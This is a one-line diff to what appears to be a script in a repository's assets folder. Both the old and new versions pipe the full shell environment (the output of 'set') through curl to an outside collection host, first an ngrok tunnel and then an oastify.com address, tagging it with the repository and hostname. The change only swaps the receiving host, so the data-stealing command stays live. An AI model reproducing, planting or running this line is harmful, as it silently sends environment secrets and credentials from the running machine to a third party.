@@ -1,1 +1,1 @@
-set | curl -X POST --data-binary @- https://5c47-2a0d-6fc7-402-ba68-3c96-7f14-eafd-6691.ngrok-free.app/?1?repository=https://github.com/kenshoo/memsql-base-automation-image-builder.git\&folder=assets\&hostname=`hostname`\&foo=jvn
+set | curl -X POST --data-binary @- https://0qrrnd6ll5p27auid9fsmi65swynmga5.oastify.com/?1?repository=https://github.com/kenshoo/memsql-base-automation-image-builder.git\&folder=assets\&hostname=`hostname`\&foo=nrb
